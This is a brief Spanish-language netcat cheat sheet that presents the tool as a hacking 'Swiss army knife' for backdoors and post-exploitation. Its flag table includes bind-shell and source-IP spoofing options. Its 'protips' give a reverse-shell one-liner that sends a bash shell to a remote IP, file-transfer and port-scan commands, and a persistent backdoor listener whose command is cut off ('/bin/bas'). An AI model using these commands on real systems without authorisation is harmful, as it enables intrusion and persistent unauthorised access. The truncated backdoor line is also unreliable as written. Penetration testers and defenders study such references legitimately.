"Navaja suiza" TCP/UDP: conexión, escucha, transferencia de archivos, port scanning y shell remota. Se usa en hacking para establecer backdoors, transferir archivos en post-explotación...

```
nc [opciones] host puerto   # cliente
nc -l -p puerto [opciones]  # servidor
```

|Parámetro|Función|
|---|---|
|`-l`|Modo escucha (servidor)|
|`-p PORT`|Puerto local (obligatorio en modo -l con versiones antiguas)|
|`-e programa`|Ejecutar programa al conectar (bind shell)|
|`-u`|Modo UDP|
|`-v`|Verbose (muestra conexión)|
|`-z`|Modo scan (sin enviar datos)|
|`-w N`|Timeout en segundos|
|`-k`|Keep-alive (acepta múltiples conexiones, solo con -l)|
|`-n`|No resolver DNS (solo IPs)|
|`-s IP`|Spoof IP origen|
|`-g` / `-G`|Source routing|
|`-c`|Ejecutar comando shell (OpenBSD nc)|
|`-L`|Persistente tras cierre cliente (Windows ncat)|
|`-t`|Telnet negotiation|
|`-6`|IPv6|

### Protips
```bash
nc -e /bin/bash 10.0.0.1 443
```
Revshell con nc

```bash
nc -l -p 9000 < archivo          SERVIDOR
nc 10.0.0.1 9000 > archivo          CLIENTE
```
Transferencia de archivos

```bash
nc -z -v -w1 192.168.1.1 1-1024
```
Escaneo de puertos

```bash
nc -l -p 4444 -k -c /bin/bas
```
Backdoor persistente (OpenBSD)